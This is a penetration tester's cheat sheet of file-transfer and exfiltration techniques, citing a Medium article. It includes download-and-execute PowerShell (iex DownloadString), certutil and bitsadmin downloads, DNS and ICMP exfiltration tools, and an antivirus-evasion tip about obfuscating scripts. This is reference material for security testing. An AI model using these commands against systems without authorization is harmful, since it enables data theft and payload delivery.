---
date: 
tags:
---

### 1. HTTP/HTTPS

```bash
# Python HTTP Server:
python3 -m http.server 80 # Python 3
python -m SimpleHTTPServer 80 # Python 2
```

```bash
# Download with wget/curl:
wget http://<IP>/file
curl -O http://<IP>/file
```

```bash
# PHP Server:
php -S 0.0.0.0:80
```

### 2. SMB (Windows)

```bash
# Impacket SMB Server:
impacket-smbserver share $(pwd) -smb2support -username user -password pass
```

```bash
# Connect from Windows:
net use \\\\<IP>\\share /user:user pass
copy \\\\<IP>\\share\\file .
```

### 3. FTP

```bash
# Python FTP Server:
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21 -w
```

```bash
# Connect with ftp:
ftp <IP>
get file
```

### 4. SCP (SSH)

```bash
# Upload/Download:
scp file.txt user@<IP>:/path # Upload
scp user@<IP>:/path/file.txt . # Download
```

### 5. Netcat (Unencrypted)

```bash
# Receiver (Listener):
nc -lvnp 4444 > file
```

```bash
# Sender:
nc <IP> 4444 < file
```

### 6. PowerShell (Windows)

```bash
# Download File:
Invoke-WebRequest -Uri http://<IP>/file -OutFile file
(New-Object Net.WebClient).DownloadFile("http://<IP>/file", "file")

# Base64 Encode/Decode:
[Convert]::ToBase64String([IO.File]::ReadAllBytes("file")) > file.b64
[IO.File]::WriteAllBytes("file", [Convert]::FromBase64String((Get-Content file.b64)))

# Basic download string
	iex (New-Object Net.Webclient).DownloadString("http://<IP>/<File>")
```

### 7. TFTP (UDP)

```bash
# Start TFTP Server:
atftpd --daemon --port 69 /tftp
```

```bash
# Download File:
tftp -i <IP> GET file
```

### 8. WebDav (HTTP)

```bash
# Python WebDav Server:
wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

```bash
# Mount in Windows:
net use * http://<IP>/webdav
```

### 9. DNS Exfiltration (Slow)

```bash
# Using dnscat2:
dnscat2 --dns server=<IP>,[domain=example.com](<http://domain=example.com/>)
```

### 10. Magic Windows Tricks

```bash
# Certutil:
certutil -urlcache -split -f http://<IP>/file
```

```bash
# Bitsadmin:
bitsadmin /transfer job /download /priority normal http://<IP>/file C:\\file
```

### 11. RDP Clipboard

```bash
Copy-paste files via RDP (enable clipboard sharing).
```

### 12. ICMP (Ping) Exfil

```bash
# icmp-exfil (Tool):
icmp-exfil -s <IP> -f file
```

### Notes:

- Encryption: Prefer SCP/HTTPS/SMB3 over unencrypted methods (FTP, HTTP, TFTP).
- Firewalls: Check allowed ports (80, 443, 445, 21, 22 are common).
- AV Evasion: Obfuscate scripts (e.g., base64-encoded PowerShell).

Source: [https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65](https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65)